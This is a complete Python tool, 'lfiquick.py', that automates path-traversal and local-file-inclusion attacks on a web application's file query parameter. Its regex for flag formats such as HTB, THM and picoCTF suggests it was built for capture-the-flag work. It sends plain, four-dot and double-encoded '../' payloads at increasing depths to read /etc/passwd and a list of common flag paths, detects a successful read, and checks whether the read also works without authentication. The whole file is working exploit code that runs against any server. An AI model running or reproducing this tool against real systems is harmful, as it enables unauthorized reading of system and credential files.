#!/usr/bin/env python3
"""lfiquick.py — bounded path-traversal/LFI read fast track.

Start with a known-valid GET URL whose query string already contains a real file
value. The helper preserves every other query field, calibrates a same-directory
missing-file control, tests a bounded set of traversal wrappers, and reuses the
exact winning wrapper and depth for common flag paths. When authentication is
supplied it also compares the baseline and winning read anonymously.

Exit codes: 0 flag or confirmed file read, 2 inconclusive/no confirmed read,
3 rate-limit/gateway/request circuit break, 4 invalid arguments.
"""
import argparse
import hashlib
import json
import os
import posixpath
import re
import sys
import time
from urllib.parse import parse_qsl, quote, quote_plus, urlsplit, urlunsplit

import requests

requests.packages.urllib3.disable_warnings()

UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
      "(KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36")
FLAG_RE = re.compile(
    r'(?<![A-Za-z0-9])(?:HTB|bug|flag|CTF|THM|PLab|picoCTF|RM|WEBVERSE)\{[^}]{3,120}\}',
    re.I)
PASSWD_RE = re.compile(r'(?m)^root:[^:\r\n]*:0:0:')
NEGATIVE_RE = re.compile(
    r'(?:not found|no such file|enoent|invalid (?:file|path)|cannot (?:get|read|open)|'
    r'failed to (?:read|open)|outside (?:allowed|upload)|path (?:denied|rejected))', re.I)
GATEWAY_FAILURES = {502, 503, 504}
FILE_FIELDS = re.compile(
    r'^(?:file|filename|file_name|filepath|file_path|path|template|download)$', re.I)
FLAG_PATHS = (
    "/flag.txt", "/flag", "/root/flag.txt", "/home/user/flag.txt",
    "/app/flag.txt", "/data/flag.txt", "/var/flag.txt",
)
STYLE_ORDER = ("plain", "four-dot", "double-encoded")


class Inconclusive(RuntimeError):
    pass


class CircuitBreak(RuntimeError):
    pass


class BudgetExhausted(RuntimeError):
    pass


def unique(items):
    return list(dict.fromkeys(item for item in items if item))


def wrapper(style, depth):
    unit = {
        "plain": "../",
        "four-dot": "....//",
        "double-encoded": "..%252f",
    }[style]
    return unit * depth


def shown(value, limit=140):
    value = value.replace("\r", "\\r").replace("\n", "\\n")
    return value if len(value) <= limit else value[:limit] + "..."


class LfiFastTrack:
    def __init__(self, args):
        self.args = args
        self.session = requests.Session()
        self.count = 0
        self.records = []
        self.possible = []
        self.confirmed = None
        self.found = None
        self.parts = urlsplit(args.url)
        self.query = parse_qsl(self.parts.query, keep_blank_values=True)
        self.param = self._resolve_param(args.param)
        values = [value for key, value in self.query if key == self.param]
        if len(values) != 1:
            raise ValueError("target query field must occur exactly once: %s" % self.param)
        self.known_value = values[0]
        if not self.known_value:
            raise ValueError("known-valid query value is empty; supply a real baseline value")

        common = {
            "User-Agent": UA,
            "Accept": "*/*",
        }
        auth_only = {}
        for item in args.header:
            if ":" not in item:
                raise ValueError("--header must be 'Name: Value': %s" % item)
            key, value = item.split(":", 1)
            key, value = key.strip(), value.strip()
            if key.lower() in ("authorization", "cookie"):
                auth_only[key] = value
            else:
                common[key] = value
        if args.token:
            auth_only["Authorization"] = "Bearer " + args.token
        if args.cookie:
            auth_only["Cookie"] = args.cookie
        self.anon_headers = dict(common)
        self.auth_headers = {**common, **auth_only}
        self.has_auth = bool(auth_only)
        self.preferred_identity = "auth" if self.has_auth else "anonymous"

        os.makedirs(args.out, exist_ok=True)
        self.log_path = os.path.join(args.out, "probes.jsonl")

    def _resolve_param(self, explicit):
        keys = [key for key, _ in self.query]
        if explicit:
            if explicit not in keys:
                raise ValueError("--param %s is absent from the URL query" % explicit)
            return explicit
        candidates = unique(key for key in keys if FILE_FIELDS.fullmatch(key))
        if len(candidates) == 1:
            return candidates[0]
        if len(keys) == 1:
            return keys[0]
        raise ValueError("name --param; the URL has multiple query fields")

    def build_url(self, raw_value):
        rendered = []
        for key, value in self.query:
            encoded_key = quote_plus(key)
            if key == self.param:
                # Percent is safe deliberately: encoded traversal wrappers must reach
                # the server exactly once instead of being encoded again by requests.
                encoded_value = quote(raw_value, safe="/.%:@-_$~")
            else:
                encoded_value = quote_plus(value)
            rendered.append("%s=%s" % (encoded_key, encoded_value))
        return urlunsplit((self.parts.scheme, self.parts.netloc, self.parts.path,
                           "&".join(rendered), self.parts.fragment))

    def headers_for(self, identity):
        return self.auth_headers if identity == "auth" else self.anon_headers

    def signature(self, response):
        ctype = (response.headers.get("Content-Type") or "").split(";", 1)[0].lower()
        return ctype, len(response.content), hashlib.sha256(response.content).hexdigest()

    def valid_baseline(self, response):
        ctype = (response.headers.get("Content-Type") or "").lower()
        if not (200 <= response.status_code < 400) or not response.content:
            return False
        if "text/html" in ctype and not self.args.allow_html_baseline:
            return False
        return True

    def _record(self, label, identity, raw_value, url, response=None, error=None):
        safe = re.sub(r'[^A-Za-z0-9_.-]+', "_", "%03d_%s_%s" % (
            self.count, identity, label)).strip("_")
        record = {
            "label": label,
            "identity": identity,
            "raw_value": raw_value,
            "url": url,
        }
        if error is not None:
            record["error"] = repr(error)
        else:
            record.update({
                "status": response.status_code,
                "headers": dict(response.headers),
                "body_preview": response.content[:8000].decode("utf-8", errors="replace"),
                "body_sha256": hashlib.sha256(response.content).hexdigest(),
            })
            with open(os.path.join(self.args.out, safe + ".headers.txt"),
                      "w", encoding="utf-8") as fh:
                fh.write("HTTP %d\n" % response.status_code)
                for key, value in response.headers.items():
                    fh.write("%s: %s\n" % (key, value))
            with open(os.path.join(self.args.out, safe + ".body"), "wb") as fh:
                fh.write(response.content)
        with open(self.log_path, "a", encoding="utf-8") as fh:
            fh.write(json.dumps(record, sort_keys=True) + "\n")
        self.records.append(record)

    def send(self, label, identity, raw_value):
        if self.count >= self.args.max_probes:
            raise BudgetExhausted("probe budget reached (%d)" % self.args.max_probes)
        if self.count:
            time.sleep(self.args.delay)
        self.count += 1
        url = self.build_url(raw_value)
        try:
            response = self.session.get(
                url, headers=self.headers_for(identity), timeout=self.args.timeout,
                allow_redirects=False, verify=False)
        except requests.RequestException as exc:
            self._record(label, identity, raw_value, url, error=exc)
            raise CircuitBreak("request failed during %s: %s" % (label, exc))
        self._record(label, identity, raw_value, url, response=response)
        print("[%02d/%02d] %-30s %-9s HTTP %d %db %s" % (
            self.count, self.args.max_probes, label, identity,
            response.status_code, len(response.content),
            (response.headers.get("Content-Type") or "-").split(";", 1)[0]))
        scan = response.content.decode("utf-8", errors="replace") + "\n" + "\n".join(
            "%s: %s" % item for item in response.headers.items())
        hits = unique(FLAG_RE.findall(scan))
        if response.status_code == 429:
            raise Inconclusive("429 rate limit during %s" % label)
        if response.status_code in GATEWAY_FAILURES:
            raise CircuitBreak("%s returned HTTP %d" % (label, response.status_code))
        return response, hits

    def missing_control_value(self):
        directory = posixpath.dirname(self.known_value)
        name = "lfiquick-missing-control.bin"
        return posixpath.join(directory, name) if directory else name

    def promising(self, response, baseline, negative):
        if self.signature(response) in (self.signature(baseline), self.signature(negative)):
            return False
        text = response.content.decode("utf-8", errors="replace")
        ctype = (response.headers.get("Content-Type") or "").lower()
        if not response.content or "text/html" in ctype or NEGATIVE_RE.search(text):
            return False
        return True

    def announce_flag(self, hits, style, depth, raw_value, identity, label):
        for hit in hits:
            print("FLAG %s" % hit)
        self.found = {
            "flags": hits,
            "style": style,
            "depth": depth,
            "raw_value": raw_value,
            "identity": identity,
            "label": label,
        }
        print("[+] winning traversal prefix: style=%s depth=%d value=%s" % (
            style, depth, shown(wrapper(style, depth))))

    def replay_anonymous(self, raw_value, expected_flags):
        if self.preferred_identity == "anonymous":
            print("[+] anonymous access confirmed (winning request was anonymous)")
            return
        response, hits = self.send("replay:anonymous", "anonymous", raw_value)
        if set(hits) & set(expected_flags):
            print("[+] anonymous replay returned the same flag")
        elif self.valid_baseline(response):
            print("[+] anonymous endpoint reachable, but the winning flag did not repeat")
        else:
            print("[-] winning read requires the supplied authentication")

    def flag_sweep(self, style, depth, identity, already=None):
        prefix = wrapper(style, depth)
        already = set(already or [])
        for target in FLAG_PATHS:
            raw_value = prefix + target.lstrip("/")
            if raw_value in already:
                continue
            response, hits = self.send("flag:%s" % target.lstrip("/").replace("/", "_"),
                                       identity, raw_value)
            if hits:
                self.announce_flag(hits, style, depth, raw_value, identity, "flag-sweep")
                return True
        return False

    def compare_confirmed_anonymous(self, raw_value):
        if self.preferred_identity == "anonymous":
            print("[+] confirmed traversal is anonymously reachable")
            return
        response, _ = self.send("confirm:anonymous", "anonymous", raw_value)
        if PASSWD_RE.search(response.content.decode("utf-8", errors="replace")):
            print("[+] confirmed traversal is anonymously reachable")
        else:
            print("[-] confirmed traversal requires the supplied authentication")

    def run(self):
        baselines = {}
        if self.has_auth:
            auth_response, auth_hits = self.send(
                "baseline", "auth", self.known_value)
            if auth_hits:
                raise Inconclusive("known-valid baseline already contains a flag")
            baselines["auth"] = auth_response
            anon_response, anon_hits = self.send(
                "baseline", "anonymous", self.known_value)
            if anon_hits:
                raise Inconclusive("anonymous baseline already contains a flag")
            baselines["anonymous"] = anon_response
            if not self.valid_baseline(auth_response) and self.valid_baseline(anon_response):
                self.preferred_identity = "anonymous"
                print("[*] supplied auth baseline failed; public baseline is valid")
        else:
            anon_response, anon_hits = self.send(
                "baseline", "anonymous", self.known_value)
            if anon_hits:
                raise Inconclusive("known-valid baseline already contains a flag")
            baselines["anonymous"] = anon_response

        baseline = baselines[self.preferred_identity]
        if not self.valid_baseline(baseline):
            raise Inconclusive(
                "known-valid baseline did not succeed with a non-HTML body; fix --url/--param")
        print("[+] valid baseline: %s=%s" % (self.param, shown(self.known_value)))

        negative, negative_hits = self.send(
            "negative-control", self.preferred_identity, self.missing_control_value())
        if negative_hits:
            raise Inconclusive("missing-file control unexpectedly contained a flag")
        if self.signature(negative) == self.signature(baseline):
            raise Inconclusive(
                "known-valid and missing-file responses are identical; baseline is not discriminating")

        styles = self.args.style or list(STYLE_ORDER)
        for style in styles:
            for depth in range(1, self.args.max_depth + 1):
                prefix = wrapper(style, depth)
                passwd_value = prefix + "etc/passwd"
                response, hits = self.send(
                    "probe:%s:d%d:passwd" % (style, depth),
                    self.preferred_identity, passwd_value)
                if hits:
                    self.announce_flag(
                        hits, style, depth, passwd_value, self.preferred_identity, "passwd-probe")
                    self.replay_anonymous(passwd_value, hits)
                    return

                text = response.content.decode("utf-8", errors="replace")
                confirmed = bool(PASSWD_RE.search(text))
                is_promising = self.promising(response, baseline, negative)
                if confirmed:
                    self.confirmed = (style, depth, passwd_value)
                    print("[+] CONFIRMED file read: style=%s depth=%d (/etc/passwd signature)" % (
                        style, depth))
                elif is_promising:
                    self.possible.append((style, depth, passwd_value))
                    print("[?] traversal-shaped differential: %s" % shown(text))

                direct_flag = prefix + "flag.txt"
                direct, direct_hits = self.send(
                    "probe:%s:d%d:flag" % (style, depth),
                    self.preferred_identity, direct_flag)
                if direct_hits:
                    self.announce_flag(
                        direct_hits, style, depth, direct_flag,
                        self.preferred_identity, "direct-flag-probe")
                    self.replay_anonymous(direct_flag, direct_hits)
                    return

                if confirmed or is_promising:
                    if self.flag_sweep(
                            style, depth, self.preferred_identity, already=[direct_flag]):
                        self.replay_anonymous(self.found["raw_value"], self.found["flags"])
                        return
                if confirmed:
                    self.compare_confirmed_anonymous(passwd_value)
                    return

        if self.possible:
            raise Inconclusive(
                "%d response differential(s) lacked a file signature or flag; inspect evidence"
                % len(self.possible))
        raise Inconclusive("bounded traversal set found no confirmed file read")


def parse_args(argv=None):
    parser = argparse.ArgumentParser(
        description="Probe one known-valid file query parameter for bounded path traversal")
    parser.add_argument("--url", required=True,
                        help="known-valid GET URL including the real baseline file value")
    parser.add_argument("--param", help="query field to mutate; inferred when unambiguous")
    parser.add_argument("--token", help="Bearer token")
    parser.add_argument("--cookie", help="Cookie header value")
    parser.add_argument("--header", action="append", default=[],
                        help="extra 'Name: Value' header; repeatable")
    parser.add_argument("--out", default="recon/lfiquick", help="evidence directory")
    parser.add_argument("--style", action="append", choices=STYLE_ORDER, default=[],
                        help="limit traversal style; repeatable")
    parser.add_argument("--max-depth", type=int, default=6)
    parser.add_argument("--max-probes", type=int, default=48)
    parser.add_argument("--delay", type=float, default=0.12)
    parser.add_argument("--timeout", type=float, default=10.0)
    parser.add_argument("--allow-html-baseline", action="store_true",
                        help="allow an intentional HTML file as the known-valid baseline")
    return parser.parse_args(argv)


def main(argv=None):
    runner = None
    try:
        args = parse_args(argv)
        if not 1 <= args.max_depth <= 8:
            raise ValueError("--max-depth must be between 1 and 8")
        if not 3 <= args.max_probes <= 80:
            raise ValueError("--max-probes must be between 3 and 80")
        if args.delay < 0 or args.timeout <= 0:
            raise ValueError("--delay must be non-negative and --timeout must be positive")
        runner = LfiFastTrack(args)
        runner.run()
        print("[*] completed %d probe(s); evidence: %s" % (runner.count, runner.log_path))
        return 0
    except (Inconclusive, BudgetExhausted) as exc:
        print("[!] INCONCLUSIVE: %s" % exc)
        return 2
    except CircuitBreak as exc:
        print("[!] CIRCUIT BREAKER: %s" % exc)
        return 3
    except (ValueError, TypeError) as exc:
        print("[!] invalid arguments: %s" % exc, file=sys.stderr)
        return 4


if __name__ == "__main__":
    sys.exit(main())
